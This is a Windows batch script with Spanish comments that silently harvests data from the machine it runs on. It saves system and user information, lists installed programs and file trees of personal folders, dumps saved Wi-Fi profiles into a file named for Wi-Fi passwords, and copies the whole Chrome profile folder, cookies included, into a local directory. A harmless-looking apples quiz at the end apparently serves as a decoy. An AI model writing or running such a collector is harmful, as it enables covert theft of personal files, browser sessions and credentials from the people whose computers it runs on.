@Echo off & CLS
:Inicio

rem Entra en carpeta para guardar datos
cd DATOS   

rem averigua el usuario actual
for /F %%i in ('whoami') do set usuario=%%i
FOR /f "tokens=1,2 delims=\" %%a IN ("%usuario%") do set usuarioactual=%%b&echo 

rem crea una carpeta asociada al equipo y a la hora en la cual se ejecuto el script 
for /F %%i in ('hostname') do set nombre=%%i
mkdir %nombre%-%usuarioactual%
cd %nombre%-%usuarioactual%


rem guarda los datos del sistema
ver > 1-versionsistema.txt
systeminfo > 2-informacionsistema.txt

rem Averigua los directorios y usuarios
echo %usuarioactual% > 3-usuarioactual.txt
dir C:\Users > 4-usuarios.txt
dir C:\ > 5-directoriosC.txt
dir "C:\Program files" > 6-programfiles.txt
dir "C:\Program files (x86)" > 7-programfilesx86.txt

dir "C:\Users\%usuarioactual%\Downloads" > 8-descargas.txt
tree /F "C:\Users\%usuarioactual%\Pictures" > 9-imagenes.txt
tree /F "C:\Users\%usuarioactual%\Videos" > 10-Videos.txt
tree /F "C:\Users\%usuarioactual%\Music" > 11-Music.txt
tree /F "C:\Users\%usuarioactual%\Desktop" > 12-Desktop.txt


driverquery > 13-controladores.txt
netsh wlan show profile > 14-redeswifi.txt


rem busca las lineas donde hace referencia al nombre de la red
for /f "tokens=*" %%h in ('findstr /i ":" 14-redeswifi.txt') do (
    @echo %%h >> 15-contrasenaredeswifi.txt
)



rem busca las lineas donde hace referencia al nombre de la red
for /f "tokens=* delims=:" %%a in (15-contrasenaredeswifi.txt) do (
    @echo %%c
)


 




pause

rem Copia las cokkies de GoogleChrome
mkdir cookiesChrome
copy "C:\Users\%usuarioactual%\AppData\Local\Google\Chrome\User Data\Default\*.*" "cookiesChrome" 






pause

Set /P respuesta=

    If %respuesta%==verdadero Call:Funcion_1
    If %respuesta%==falso Call:Funcion_2
    If NOT DEFINED %respuesta%  Goto Inicio
    Exit


:Funcion_1
  Echo Si! Felicidades!
GOTO:EOF

:Funcion_2
Echo Te haz equivocado, me gustan mucho las manzanas.
GOTO:EOF
